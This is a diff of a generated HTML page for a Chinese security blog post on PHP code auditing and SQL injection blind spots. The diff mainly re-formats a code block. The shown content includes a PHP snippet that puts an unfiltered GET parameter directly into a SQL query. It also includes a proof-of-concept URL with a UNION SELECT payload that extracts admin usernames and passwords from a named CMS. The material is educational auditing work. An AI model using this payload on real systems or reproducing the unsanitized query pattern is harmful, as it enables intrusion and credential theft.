@@ -93,7 +93,7 @@
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql5_02.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql5_03.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql5_03.png">
-<meta property="og:updated_time" content="2016-05-03T01:13:11.075Z">
+<meta property="og:updated_time" content="2016-05-03T08:31:12.306Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 6.全局防护盲点的总结前篇">
 <meta name="twitter:description" content="0x01 背景现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，比如最经典的整型参数传递，也即被带入数据库查询的参数是整型、数组中的key没过滤被带入了查询以及全局过滤了GET、POST但没过滤SERVER或COOKIE引发的注入。所以看似有全局防护，实则隐藏了很多“后门”～盲点如下：①注入">
@@ -333,16 +333,8 @@
 <h2 id="0x03_漏洞分析">0x03 漏洞分析</h2><h3 id="首先是完全无视GPC的数字型的注入，其实仔细总结下发现还是很多可以学习的地方。">首先是<strong>完全无视GPC的数字型的注入</strong>，其实仔细总结下发现还是很多可以学习的地方。</h3><blockquote>
 <p>A.传入的参数未做intval转换、构造的sql语句没有单引号保护</p>
 </blockquote>
-<p>这个还是比较常见的，当初笔者挖到过一些，乌云案例<a href="http://www.wooyun.org/bugs/wooyun-2010-065605" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-065605</a></p>
-<pre><code>&lt;?php
-require_once <span class="string">"admin/common.php"</span>;
-require_once(MOBAN_PATH_QZ.<span class="string">"header.html"</span>);
-//这里typeid没有做整形转换
-<span class="variable">$typeid</span>=isset($_GET[<span class="string">'typeid'</span>]) ? $_GET[<span class="string">'typeid'</span>] : <span class="number">1</span>;
-//sql语句没有单引号保护
-<span class="variable">$type</span>=<span class="variable">$db-</span>&gt;fetch_array(mysql_query(<span class="variable">$sql</span>=<span class="string">"select * from "</span>.<span class="variable">$db-</span>&gt;tablepre.<span class="string">"newstype where newstypeid="</span>.<span class="variable">$typeid</span>));//typeid参数存在注入，数字型；
-?&gt;
-</code></pre><p>获取管理员账户密码的POC：</p>
+<p>这个还是比较常见的，当初笔者挖到过一些，乌云案例<a href="http://www.wooyun.org/bugs/wooyun-2010-065605" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-065605</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"admin/common.php"</span>;</span><br><span class="line"><span class="keyword">require_once</span>(MOBAN_PATH_QZ.<span class="string">"header.html"</span>);</span><br><span class="line"><span class="comment">//这里typeid没有做整形转换</span></span><br><span class="line"><span class="variable">$typeid</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'typeid'</span>]) ? <span class="variable">$_GET</span>[<span class="string">'typeid'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="comment">//sql语句没有单引号保护</span></span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$db</span>-&gt;fetch_array(mysql_query(<span class="variable">$sql</span>=<span class="string">"select * from "</span>.<span class="variable">$db</span>-&gt;tablepre.<span class="string">"newstype where newstypeid="</span>.<span class="variable">$typeid</span>));<span class="comment">//typeid参数存在注入，数字型；</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>获取管理员账户密码的POC：</p>
 <pre><code>http://localhost/jdy1.5/typeid.php?typeid=1 and 1=2 UNION <span class="operator">SELECT <span class="literal">NULL</span>,(select <span class="keyword">concat</span>(username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> jdy_admin <span class="keyword">limit</span> <span class="number">1</span>),<span class="literal">NULL</span>,</span>
 </code></pre><p><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql5_01.jpg" alt=""></p>
 <blockquote>
